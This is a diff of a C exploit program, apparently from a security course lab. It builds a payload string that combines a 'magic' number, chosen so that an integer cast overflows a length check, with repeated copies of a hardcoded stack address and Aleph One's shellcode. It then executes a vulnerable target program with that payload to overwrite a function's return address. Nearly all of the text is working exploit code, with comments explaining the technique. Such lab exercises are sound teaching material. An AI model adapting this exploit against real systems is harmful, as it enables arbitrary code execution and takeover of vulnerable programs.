@@ -28,35 +28,38 @@ int main(void)
 {
   char *args[3];
   char *env[1];
-
-  args[0] = TARGET; args[2] = NULL;
-  env[0] = NULL;
-
-  char *magic = " 4080219932,";
+  char *magic = " 4080219932,"; /* This is the magical number that when casted
+                                   to an int will overflow count by the right 
+                                   amount so that we can fill the buffer
+                                   in foo with shellcode and overwrite 
+                                   the return address of foo. */
   long buffAddr, *addrPtr;
-  char exploitStr[STR_SIZE]; /* string containing exploit code */
+  char egg[EGG_SIZE]; /* string containing exploit code */
   char *ptr;
   int i;
 
-  buffAddr = 0xBFFF61C8; /* start address of buf in target1.c:foo */
+  buffAddr = 0xBFFF61C8; /* start address of buf in target3.c:foo */
   
   /* First fill the exploit string with the address of the buf in foo. 
      This will ensure that we overwrite the return address with the 
-     start address of our code */
-  addrPtr = (long *) exploitStr; 
-  for (i = 0; i < STR_SIZE; i += 4)
+     start address of our code. */
+  addrPtr = (long *) egg; 
+  for (i = 0; i < EGG_SIZE; i += 4)
     *(addrPtr++) = buffAddr;
   
-  memcpy (exploitStr, magic, strlen (magic));
+  /* Copy the magical string to the beggining, dont copy the null byte. */
+  memcpy (egg, magic, strlen (magic));
   	
-  /* Then fill the first bytes of the exploit string with
+  /* Then fill the next bytes of the exploit string with
      Aleph One's shellcode */
-  ptr = &exploitStr[strlen (magic)];
+  ptr = &egg[strlen (magic)];
   for (i = 0; i < strlen(shellcode); i++)
     *(ptr++) = shellcode[i];
 
-  exploitStr[STR_SIZE - 1] = 0; /* null terminate exploit string for safety */
-  args[1] = exploitStr;
+  egg[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */
+
+  args[0] = TARGET; args[1] = egg; args[2] = NULL;
+  env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
